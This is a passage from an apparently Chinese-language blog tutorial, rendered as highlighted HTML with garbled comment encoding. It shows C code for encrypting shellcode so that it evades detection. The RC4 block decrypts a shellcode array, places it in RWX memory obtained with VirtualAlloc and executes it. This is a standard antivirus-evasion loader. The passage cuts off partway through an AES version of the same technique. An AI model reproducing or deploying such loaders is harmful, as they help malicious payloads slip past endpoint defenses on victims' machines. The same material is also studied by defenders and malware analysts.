class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RC4åŠ å¯†Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RC4åŠ å¯†ç®—æ³•å®ç°</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â *data,Â <span class="type">int</span>Â data_len,Â <span class="type">unsigned</span>Â <span class="type">char</span>Â *key,Â <span class="type">int</span>Â key_len)</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â S[<span class="number">256</span>];</span><br><span class="line">Â  Â Â <span class="type">int</span>Â i, j =Â <span class="number">0</span>;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// åˆå§‹åŒ–Sæ•°ç»„</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (i =Â <span class="number">0</span>; i &lt;Â <span class="number">256</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  S[i] = (<span class="type">unsigned</span>Â <span class="type">char</span>)i;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// å¯†é’¥è°ƒåº¦ç®—æ³• (KSA)</span></span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (i =Â <span class="number">0</span>; i &lt;Â <span class="number">256</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â  j = (j + S[i] + key[i % key_len]) &amp;Â <span class="number">0xFF</span>; Â <span class="comment">// ç­‰åŒäºæ¨¡256è¿ç®—</span></span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// äº¤æ¢S[i]å’ŒS[j]</span></span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â temp = S[i];</span><br><span class="line">Â  Â  Â  Â  S[i] = S[j];</span><br><span class="line">Â  Â  Â  Â  S[j] = temp;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³• (PRGA)</span></span><br><span class="line">Â  Â  i =Â <span class="number">0</span>;</span><br><span class="line">Â  Â  j =Â <span class="number">0</span>;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â k =Â <span class="number">0</span>; k &lt; data_len; k++) &#123;</span><br><span class="line">Â  Â  Â  Â  i = (i +Â <span class="number">1</span>) &amp;Â <span class="number">0xFF</span>;</span><br><span class="line">Â  Â  Â  Â  j = (j + S[i]) &amp;Â <span class="number">0xFF</span>;</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// äº¤æ¢S[i]å’ŒS[j]</span></span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â temp = S[i];</span><br><span class="line">Â  Â  Â  Â  S[i] = S[j];</span><br><span class="line">Â  Â  Â  Â  S[j] = temp;</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// ç”Ÿæˆä¼ªéšæœºæ•°ï¼Œå¹¶ä¸æ•°æ®å¼‚æˆ–</span></span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â rnd = S[(S[i] + S[j]) &amp;Â <span class="number">0xFF</span>];</span><br><span class="line">Â  Â  Â  Â  data[k] ^= rnd;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>Â <span class="title">main</span><span class="params">()</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â shellcode[] =Â <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>;Â <span class="comment">// ç¤ºä¾‹Shellcode</span></span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â key[] =Â <span class="string">&quot;secretkey&quot;</span>;Â <span class="comment">// åŠ å¯†å¯†é’¥</span></span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â  <span class="built_in">rc4_crypt</span>(shellcode,Â <span class="built_in">sizeof</span>(shellcode) -Â <span class="number">1</span>, key,Â <span class="built_in">sizeof</span>(key) -Â <span class="number">1</span>);</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="comment">// åˆ†é…å†…å­˜å¹¶æ‰§è¡Œ</span></span><br><span class="line">Â  Â Â <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>,Â <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(exec, shellcode,Â <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">Â  Â  ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">Â  Â Â </span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AESåŠ å¯†Shellcode"><code>AES</code>åŠ å¯†<code>Shellcode</code></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AESåŠ å¯†Shellcode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>Â <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AESåŸºæœ¬å¸¸é‡ä¸è¾…åŠ©å‡½æ•° ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES S-box</span></span><br><span class="line"><span class="type">static</span>Â <span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>Â sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">Â  Â Â <span class="comment">/* 0x00 */</span>Â <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x10 */</span>Â <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x20 */</span>Â <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x30 */</span>Â <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x40 */</span>Â <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x50 */</span>Â <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x60 */</span>Â <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x70 */</span>Â <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x80 */</span>Â <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0x90 */</span>Â <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xA0 */</span>Â <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xB0 */</span>Â <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xC0 */</span>Â <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xD0 */</span>Â <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xE0 */</span>Â <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line">Â  Â Â <span class="comment">/* 0xF0 */</span>Â <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES Rconæ•°ç»„ï¼Œç”¨äºå¯†é’¥æ‰©å±•ï¼ˆæ³¨æ„ç¬¬ä¸€ä¸ªå…ƒç´ æœªç”¨ï¼‰</span></span><br><span class="line"><span class="type">static</span>Â <span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>Â Rcon[<span class="number">11</span>] = &#123;Â </span><br><span class="line">Â  Â Â <span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1B</span>,<span class="number">0x36</span>Â </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// xtimeå‡½æ•°ï¼šGF(2^8)ä¸­ä¹˜2è¿ç®—</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span>Â <span class="type">char</span>Â <span class="title">xtime</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â x)</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">return</span>Â (x &lt;&lt;Â <span class="number">1</span>) ^ ((x &gt;&gt;Â <span class="number">7</span>) &amp;Â <span class="number">1</span>Â ?Â <span class="number">0x1B</span>Â :Â <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AESæ ¸å¿ƒå‡½æ•° ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ è½®å¯†é’¥ï¼šå°†çŠ¶æ€æ•°ç»„ä¸è½®å¯†é’¥å¼‚æˆ–</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">AddRoundKey</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â state[<span class="number">16</span>],Â <span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>Â roundKey[<span class="number">16</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">16</span>; i++)</span><br><span class="line">Â  Â  Â  Â  state[i] ^= roundKey[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­—èŠ‚ä»£æ¢ï¼šä½¿ç”¨S-boxå¯¹çŠ¶æ€æ•°ç»„ä¸­æ¯ä¸ªå­—èŠ‚æ›¿æ¢</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">SubBytes</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â state[<span class="number">16</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">16</span>; i++)</span><br><span class="line">Â  Â  Â  Â  state[i] = sbox[state[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¡Œç§»ä½ï¼šå¯¹çŠ¶æ€æ•°ç»„çš„æ¯ä¸€è¡Œè¿›è¡Œå¾ªç¯å·¦ç§»</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">ShiftRows</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â state[<span class="number">16</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â temp[<span class="number">16</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬ä¸€è¡Œä¸å˜</span></span><br><span class="line">Â  Â  temp[<span class="number">0</span>] Â = state[<span class="number">0</span>];</span><br><span class="line">Â  Â  temp[<span class="number">4</span>] Â = state[<span class="number">4</span>];</span><br><span class="line">Â  Â  temp[<span class="number">8</span>] Â = state[<span class="number">8</span>];</span><br><span class="line">Â  Â  temp[<span class="number">12</span>] = state[<span class="number">12</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬äºŒè¡Œå·¦ç§»1ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">1</span>] Â = state[<span class="number">5</span>];</span><br><span class="line">Â  Â  temp[<span class="number">5</span>] Â = state[<span class="number">9</span>];</span><br><span class="line">Â  Â  temp[<span class="number">9</span>] Â = state[<span class="number">13</span>];</span><br><span class="line">Â  Â  temp[<span class="number">13</span>] = state[<span class="number">1</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬ä¸‰è¡Œå·¦ç§»2ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">2</span>] Â = state[<span class="number">10</span>];</span><br><span class="line">Â  Â  temp[<span class="number">6</span>] Â = state[<span class="number">14</span>];</span><br><span class="line">Â  Â  temp[<span class="number">10</span>] = state[<span class="number">2</span>];</span><br><span class="line">Â  Â  temp[<span class="number">14</span>] = state[<span class="number">6</span>];</span><br><span class="line">Â  Â Â <span class="comment">// ç¬¬å››è¡Œå·¦ç§»3ä½</span></span><br><span class="line">Â  Â  temp[<span class="number">3</span>] Â = state[<span class="number">15</span>];</span><br><span class="line">Â  Â  temp[<span class="number">7</span>] Â = state[<span class="number">3</span>];</span><br><span class="line">Â  Â  temp[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">Â  Â  temp[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(state, temp,Â <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ—æ··åˆï¼šå¯¹çŠ¶æ€æ•°ç»„çš„æ¯ä¸€åˆ—è¿›è¡Œæ··åˆå˜æ¢</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">MixColumns</span><span class="params">(<span class="type">unsigned</span>Â <span class="type">char</span>Â state[<span class="number">16</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="type">int</span>Â col = i *Â <span class="number">4</span>;</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â a0 = state[col];</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â a1 = state[col<span class="number">+1</span>];</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â a2 = state[col<span class="number">+2</span>];</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â a3 = state[col<span class="number">+3</span>];</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// æ ¹æ®GF(2^8)è¿ç®—å®ç°2å’Œ3çš„ä¹˜æ³•</span></span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â b0 = <span class="built_in">xtime</span>(a0) ^ (<span class="built_in">xtime</span>(a1) ^ a1) ^ a2 ^ a3;</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â b1 = a0 ^ <span class="built_in">xtime</span>(a1) ^ (<span class="built_in">xtime</span>(a2) ^ a2) ^ a3;</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â b2 = a0 ^ a1 ^ <span class="built_in">xtime</span>(a2) ^ (<span class="built_in">xtime</span>(a3) ^ a3);</span><br><span class="line">Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â b3 = (<span class="built_in">xtime</span>(a0) ^ a0) ^ a1 ^ a2 ^ <span class="built_in">xtime</span>(a3);</span><br><span class="line">Â  Â  Â  Â  state[col] Â  = b0;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+1</span>] = b1;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+2</span>] = b2;</span><br><span class="line">Â  Â  Â  Â  state[col<span class="number">+3</span>] = b3;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯†é’¥æ‰©å±•ï¼šç”±16å­—èŠ‚çš„åˆå§‹å¯†é’¥æ‰©å±•å¾—åˆ°176å­—èŠ‚çš„è½®å¯†é’¥</span></span><br><span class="line"><span class="function"><span class="type">void</span>Â <span class="title">KeyExpansion</span><span class="params">(<span class="type">const</span>Â <span class="type">unsigned</span>Â <span class="type">char</span>* key,Â <span class="type">unsigned</span>Â <span class="type">char</span>Â roundKeys[<span class="number">176</span>])</span>Â </span>&#123;</span><br><span class="line">Â  Â Â <span class="built_in">memcpy</span>(roundKeys, key,Â <span class="number">16</span>);</span><br><span class="line">Â  Â Â <span class="type">int</span>Â bytesGenerated =Â <span class="number">16</span>;</span><br><span class="line">Â  Â Â <span class="type">int</span>Â rconIteration =Â <span class="number">1</span>;</span><br><span class="line">Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â temp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">Â  Â Â <span class="keyword">while</span>Â (bytesGenerated &lt;Â <span class="number">176</span>) &#123;</span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// å–å‰4ä¸ªå­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">for</span>Â (<span class="type">int</span>Â i =Â <span class="number">0</span>; i &lt;Â <span class="number">4</span>; i++)</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[i] = roundKeys[bytesGenerated -Â <span class="number">4</span>Â + i];</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â Â <span class="comment">// æ¯16å­—èŠ‚æ—¶ï¼Œè¿›è¡Œå¯†é’¥è°ƒåº¦æ ¸å¿ƒå˜æ¢</span></span><br><span class="line">Â  Â  Â  Â Â <span class="keyword">if</span>Â (bytesGenerated %Â <span class="number">16</span>Â ==Â <span class="number">0</span>) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="comment">// å¾ªç¯å·¦ç§»1å­—èŠ‚</span></span><br><span class="line">Â  Â  Â  Â  Â  Â Â <span class="type">unsigned</span>Â <span class="type">char</span>Â t = temp[<span class="number">0</span>];</span><br><span class="line">Â  Â  Â  Â  Â  Â  temp[<span class="number">0</span>] = temp[<span class="number">1</span>];</span><br><span class="line">Â  Â  Â  